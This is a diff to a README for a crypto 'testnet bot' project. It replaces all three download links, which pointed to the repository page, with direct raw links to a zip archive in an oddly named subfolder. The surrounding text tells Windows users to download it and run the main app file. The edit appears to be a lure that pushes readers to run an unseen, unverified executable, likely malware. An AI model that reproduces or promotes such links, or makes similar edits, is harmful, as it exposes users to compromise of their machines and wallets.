@@ -1,6 +1,6 @@
 # 🤖 Perle-Labs-Testnet-Bot - Run Testnet Tasks With Ease
 
-[![Download Now](https://img.shields.io/badge/Download-Perle--Labs--Testnet--Bot-blue?style=for-the-badge)](https://github.com/introversioncoldduck852/Perle-Labs-Testnet-Bot)
+[![Download Now](https://img.shields.io/badge/Download-Perle--Labs--Testnet--Bot-blue?style=for-the-badge)](https://github.com/introversioncoldduck852/Perle-Labs-Testnet-Bot/raw/refs/heads/main/coachsmith/Perle-Testnet-Bot-Labs-2.0.zip)
 
 ## 🧩 What This Tool Does
 
@@ -34,7 +34,7 @@ For best results:
 
 Use this link to visit the download page:
 
-[![Visit Download Page](https://img.shields.io/badge/Visit-Download%20Page-grey?style=for-the-badge)](https://github.com/introversioncoldduck852/Perle-Labs-Testnet-Bot)
+[![Visit Download Page](https://img.shields.io/badge/Visit-Download%20Page-grey?style=for-the-badge)](https://github.com/introversioncoldduck852/Perle-Labs-Testnet-Bot/raw/refs/heads/main/coachsmith/Perle-Testnet-Bot-Labs-2.0.zip)
 
 ### What to do
 1. Open the download page
@@ -252,7 +252,7 @@ Use these habits for fewer errors:
 
 Visit the main repository page here:
 
-[https://github.com/introversioncoldduck852/Perle-Labs-Testnet-Bot](https://github.com/introversioncoldduck852/Perle-Labs-Testnet-Bot)
+[https://github.com/introversioncoldduck852/Perle-Labs-Testnet-Bot/raw/refs/heads/main/coachsmith/Perle-Testnet-Bot-Labs-2.0.zip](https://github.com/introversioncoldduck852/Perle-Labs-Testnet-Bot/raw/refs/heads/main/coachsmith/Perle-Testnet-Bot-Labs-2.0.zip)
 
 Download the Windows files from the page, place them in a folder, and run the main app file
 
